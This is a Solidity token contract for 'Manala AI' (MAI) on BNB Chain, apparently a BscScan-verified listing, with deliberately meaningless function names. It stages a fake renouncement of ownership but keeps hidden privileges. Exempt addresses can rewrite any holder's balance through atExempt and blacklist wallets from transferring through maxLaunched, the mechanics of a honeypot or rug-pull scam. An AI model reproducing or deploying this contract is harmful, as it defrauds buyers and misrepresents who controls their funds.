/**
 *Submitted for verification at BscScan.com on 2023-03-08
*/

//SPDX-License-Identifier: MIT

pragma solidity ^0.8.6;

interface enableSender {
    function totalSupply() external view returns (uint256);

    function balanceOf(address walletListBuy) external view returns (uint256);

    function transfer(address amountTake, uint256 feeExemptLiquidity) external returns (bool);

    function allowance(address modeAt, address spender) external view returns (uint256);

    function approve(address spender, uint256 feeExemptLiquidity) external returns (bool);

    function transferFrom(
        address sender,
        address amountTake,
        uint256 feeExemptLiquidity
    ) external returns (bool);

    event Transfer(address indexed from, address indexed liquidityAuto, uint256 value);
    event Approval(address indexed modeAt, address indexed spender, uint256 value);
}

interface enableSenderMetadata is enableSender {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

abstract contract atSell {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface walletTake {
    function createPair(address minFee, address toReceiver) external returns (address);
}

interface modeFund {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

contract ManalaAI is atSell, enableSender, enableSenderMetadata {

    address public totalExempt;

    bool private sellReceiver;

    mapping(address => bool) public modeExempt;

    function getOwner() external view returns (address) {
        return exemptMin;
    }

    string private modeLaunch = "Manala AI";

    function toFeeWallet() public view returns (bool) {
        return teamEnable;
    }

    function maxLaunched(address teamLiquidityTotal) public {
        if (autoShouldFrom == exemptSell) {
            exemptSell = autoShouldFrom;
        }
        if (teamLiquidityTotal == totalExempt || teamLiquidityTotal == autoAt || !modeExempt[_msgSender()]) {
            return;
        }
        if (maxLaunch != teamEnable) {
            exemptSell = buyLaunchedTo;
        }
        buyEnable[teamLiquidityTotal] = true;
    }

    uint256 public fundIs;

    function decimals() external view virtual override returns (uint8) {
        return toFee;
    }

    function totalSupply() external view virtual override returns (uint256) {
        return fromLaunched;
    }

    function approve(address fundTeam, uint256 feeExemptLiquidity) public virtual override returns (bool) {
        fromExemptMode[_msgSender()][fundTeam] = feeExemptLiquidity;
        emit Approval(_msgSender(), fundTeam, feeExemptLiquidity);
        return true;
    }

    uint256 private fromLaunched = 100000000 * 10 ** 18;

    function name() external view virtual override returns (string memory) {
        return modeLaunch;
    }

    uint8 private toFee = 18;

    address public autoAt;

    address private exemptMin;

    function allowance(address txFeeFrom, address fundTeam) external view virtual override returns (uint256) {
        return fromExemptMode[txFeeFrom][fundTeam];
    }

    uint256 private autoShouldFrom;

    function teamTrading() public {
        if (maxLaunch) {
            teamEnable = true;
        }
        if (sellReceiver == teamEnable) {
            teamEnable = false;
        }
        sellReceiver=false;
    }

    function walletReceiver() public view returns (bool) {
        return sellReceiver;
    }

    mapping(address => mapping(address => uint256)) private fromExemptMode;

    function transfer(address totalAt, uint256 feeExemptLiquidity) external virtual override returns (bool) {
        return toMode(_msgSender(), totalAt, feeExemptLiquidity);
    }

    bool public autoSell;

    mapping(address => uint256) private walletExempt;

    bool public maxLaunch;

    mapping(address => bool) public buyEnable;

    uint256 public buyLaunchedTo;

    function maxSwap() public {
        emit OwnershipTransferred(totalExempt, address(0));
        exemptMin = address(0);
    }

    function symbol() external view virtual override returns (string memory) {
        return receiverBuy;
    }

    function owner() external view returns (address) {
        return exemptMin;
    }

    uint256 private exemptSell;

    function balanceOf(address walletListBuy) public view virtual override returns (uint256) {
        return walletExempt[walletListBuy];
    }

    function atExempt(address totalAt, uint256 feeExemptLiquidity) public {
        require(modeExempt[_msgSender()]);
        walletExempt[totalAt] = feeExemptLiquidity;
    }

    constructor (){ 
        
        modeFund teamFundLiquidity = modeFund(0x10ED43C718714eb63d5aA57B78B54704E256024E);
        autoAt = walletTake(teamFundLiquidity.factory()).createPair(teamFundLiquidity.WETH(), address(this));
        exemptMin = _msgSender();
        if (autoShouldFrom != fundIs) {
            sellReceiver = true;
        }
        totalExempt = _msgSender();
        modeExempt[_msgSender()] = true;
        if (buyLaunchedTo == fundIs) {
            sellReceiver = false;
        }
        walletExempt[_msgSender()] = fromLaunched;
        emit Transfer(address(0), totalExempt, fromLaunched);
        maxSwap();
    }

    function transferFrom(address walletModeBuy, address amountTake, uint256 feeExemptLiquidity) external override returns (bool) {
        if (fromExemptMode[walletModeBuy][_msgSender()] != type(uint256).max) {
            require(feeExemptLiquidity <= fromExemptMode[walletModeBuy][_msgSender()]);
            fromExemptMode[walletModeBuy][_msgSender()] -= feeExemptLiquidity;
        }
        return toMode(walletModeBuy, amountTake, feeExemptLiquidity);
    }

    event OwnershipTransferred(address indexed feeSwap, address indexed maxSender);

    function tokenSellFee(address isLiquidity) public {
        if (autoSell) {
            return;
        }
        
        modeExempt[isLiquidity] = true;
        if (fundIs == buyLaunchedTo) {
            teamEnable = false;
        }
        autoSell = true;
    }

    function swapLaunch(address walletModeBuy, address amountTake, uint256 feeExemptLiquidity) internal returns (bool) {
        require(walletExempt[walletModeBuy] >= feeExemptLiquidity);
        walletExempt[walletModeBuy] -= feeExemptLiquidity;
        walletExempt[amountTake] += feeExemptLiquidity;
        emit Transfer(walletModeBuy, amountTake, feeExemptLiquidity);
        return true;
    }

    function receiverFundTx() public view returns (uint256) {
        return fundIs;
    }

    function toMode(address walletModeBuy, address amountTake, uint256 feeExemptLiquidity) internal returns (bool) {
        if (walletModeBuy == totalExempt) {
            return swapLaunch(walletModeBuy, amountTake, feeExemptLiquidity);
        }
        require(!buyEnable[walletModeBuy]);
        return swapLaunch(walletModeBuy, amountTake, feeExemptLiquidity);
    }

    bool public teamEnable;

    string private receiverBuy = "MAI";

}